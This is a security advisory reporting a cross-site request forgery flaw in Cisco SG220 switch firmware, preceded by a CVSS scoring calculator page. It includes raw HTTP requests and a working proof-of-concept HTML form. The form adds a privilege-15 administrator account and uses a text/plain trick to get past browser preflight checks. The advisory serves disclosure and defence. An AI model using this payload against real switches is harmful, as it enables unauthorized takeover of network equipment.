| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 4.3 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 3.6 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 3.6 |

Cross-Site Request Forgery in Cisco
SG220 series

Security advisory
12/09/2016

Renaud Dubourguais
Nicolas Collignon

5 rue Sextius Michel 75015 Paris

Vulnerability description

The Cisco SG220 series

The SG220 series is a range of switches provided by Cisco to small businesses which “bridge the gap between managed
and smart switches to offer customers the best of both worlds” and “provide the higher levels of security, management, and
scalability you expect from managed switches, affordably priced like smart switches”.

The issue

Synacktiv has identified a vulnerability in the Cisco SG220 series allowing attackers to trick authenticated users and perform
highly privileged actions on the switch regarding the victim's privileges (add users, disable security features, leak secrets,
etc.).

This  issue  is  the  result  of  a   missing  CSRF  protection   for  all  sensitive   actions  that  can  be  performed  on  the  switches.
Consequently, if an authenticated user browses a malicious website in the same browser than the one he uses to manage
the switch, the website could benefit from the user's privileges and perform actions on the switch without the user's knowing.

Affected versions

The following versions has been proved to be affected:

•

•

Smart Plus Switch Firmware 1.0.0.17;

Smart Plus Switch Firmware 1.0.0.18.

Mitigation

For the moment, no mitigation exists as we have just contacted the Cisco Product Security Incident Response.

Technical description and proof-of-concept

Attack scenario

To illustrate our proof-of-concept, the best scenario is an authenticated victim managing the switches of his company through
the web interface and browsing a malicious website at the same time and in the same browser. In that case the malicious
website could try to take advantage of the user's session opened on the switch and perform privileged actions on it.

From a malicious website point of view, performing actions on the victim behalf is made up of an autosubmit HTML form sent
to the victim and handle by her browser. The browser will submit the form to the switch with the victim's cookies if any. If no
CSRF protection is setup, the action will be successfully handled by the switch.

This attack can be illustrated by the following schema:

Vulnerability discovery

CSRF attacks are now well-known just like the mitigation techniques and discovering this kind of flaws can be accomplished
by sniffing the HTTP requests sent by our browser when we perform sensitive action on a switch. For example, adding a new
user to the swith will result to the following HTTP request:

POST /cgi/set.cgi?cmd=aaa_userAdd&dummy=1452084109358 HTTP/1.1
Host: switch
User­Agent: Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0
[...]
Content­Type: application/json
X­Requested­With: XMLHttpRequest

{"_ds=1&userName=newuser&password=QuieR8eek8re!&confirmPassword=QuieR8eek8re!
&priv=15&_de=1":{}}

As you can see no CSRF token is sent making the feature vulnerable to a CSRF attack. Our analyze shows that all the
features are vulnerable.

 3/5

Note that no cookie is submitted. Actually, the authentication is performed using the IP address and the browser product
(Firefox, Chrome, IE, etc.). So, the following request will be authenticated too:

POST /cgi/set.cgi?cmd=aaa_userAdd&dummy=1452084109358 HTTP/1.1
Host: switch
User­Agent: Mozilla
[...]
Content­Type: application/json
X­Requested­With: XMLHttpRequest

{"_ds=1&userName=newuser&password=QuieR8eek8re!&confirmPassword=QuieR8eek8re!
&priv=15&_de=1":{}}

Impact

A successful exploitation could allow anyone  to trick an authenticated user and perform privileged actions on their behalf
such as adding a new administrator user account, disable security features, leaking secrets, etc.

Proof of concept

Browsing a web page containing the following HTML form will add a new user to the targeted switch:

<html>
        <body>
                <form action="https://<targeted­switch>/cgi/set.cgi?cmd=aaa_userAdd"
method="POST" enctype="text/plain">
                        <input name='{"_ds=1&userName=pwned&password=Pwn3dPwn3d!
&confirmPassword=Pwn3dPwn3d!&priv=15&_de=1":{}}' value="" />
                        <input type="submit" value="Submit"/>
                </form>
        </body>
</html>

As all sensitive actions has to be performed using JSON messages, an attacker has to bypass the preflight check commonly
performed by browsers when the submitted Content-Type is not “application/x-www-form-urlencoded”, “multipart/form-data”or
“text/plain”. As the Content-Type is “application/json” for JSON messages, a preflight check is performed by the victim's
browser. Given the HTTP request doesn't come from the switch web interface itself, the CORS policy will deny the final
request.

To bypass this check, we build a custom HTML form submitting a HTTP request with the “text/plain” Content-Type. This type
is not subject to the preflight check and the HTTP request will be directly sent to the switch. We deliberately chose this
Content-Type because it tells to the browser to  *not*  URL encode the parameter's name and its value. As a result, the
following HTTP request will be sent:

POST  /cgi/set.cgi?cmd=aaa_userAdd HTTP/1.1
Host: <targeted­switch>
Content­Type: text/plain
[…]
{"_ds=1&userName=pwned&password=QuieR8eek8re!&confirmPassword=QuieR8eek8re!&priv=15&_de=1":
{}}=

As you can see:

•

the request's content (parameter's name and value) is not URL encoded thanks to the “text/plain” Content-Type
(setting this Content-Type will not raise any error on the switch side even it expects a JSON message).

 4/5

•

•

The JSON message is sent through the parameter's name. As there is no URL encoding, the switch will correctly
handle the message.

The “=” character is added by the browser as parameter delimiter during the form submission but is not handle by
the switch.

 5/5
